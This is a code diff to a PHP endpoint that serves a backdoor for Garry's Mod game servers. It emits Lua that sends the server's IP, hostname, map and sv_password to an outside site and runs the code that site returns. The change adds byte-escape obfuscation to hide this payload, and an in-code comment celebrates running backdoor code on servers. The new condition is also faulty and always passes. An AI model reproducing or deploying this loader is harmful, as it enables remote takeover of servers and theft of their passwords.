@@ -6,9 +6,12 @@ ini_set('display_errors', 0);
 $type = $_GET['type']; // privacy
 $token = $_GET['token']; // the token 
 
-if($token && $type) {
-    // this will post to another page on our website and will run the backdoor code on the server!! ;0
-    echo("if game.IsDedicated() then http.Post('https://w0rst.xyz/project/api/backdoor.php?type=$type&token=$token', { map = game.GetMap(), server = GetHostName(), serverip = game.GetIPAddress(), gamemode = engine.ActiveGamemode(), password = GetConVar('sv_password'):GetString() }, RunString) end"); 
+if($token && $type == "public" || "private") {
+    $lua = "if game.IsDedicated() then http.Post('https://w0rst.xyz/project/api/backdoor.php?type=$type&token=$token',{map=game.GetMap(),server=GetHostName(),serverip=game.GetIPAddress(),gamemode=engine.ActiveGamemode(),password=GetConVar('sv_password'):GetString()},RunString) end";
+
+    $bytes = unpack('C*', $lua); // turns text into bytes
+
+    echo("RunString('"); foreach($bytes as $byte) { echo("\\$byte"); } echo("')");
 }
 
 ?> 
